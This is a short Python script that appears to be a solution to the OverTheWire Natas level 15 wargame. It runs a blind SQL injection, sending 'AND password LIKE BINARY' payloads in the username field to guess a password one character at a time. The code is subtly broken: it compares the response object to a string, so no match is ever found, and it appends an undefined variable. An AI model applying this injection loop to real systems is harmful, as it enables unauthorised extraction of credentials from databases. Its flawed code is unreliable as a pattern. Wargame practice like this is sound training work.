import requests
import string

dic=''.join([string.ascii_letters, string.digits])
url = 'http://natas15.natas.labs.overthewire.org/index.php'
password = ''

for i in range(1,64):
	for j in dic:
		testString = password + j
		string = 'natas16" AND password LIKE BINARY "'+testString+'%'
		print(string)
		res = requests.post(url+'?', data={'username':string})
		print(res)
		if (res == "This user exists.<br>"):
			password += char
print(password)
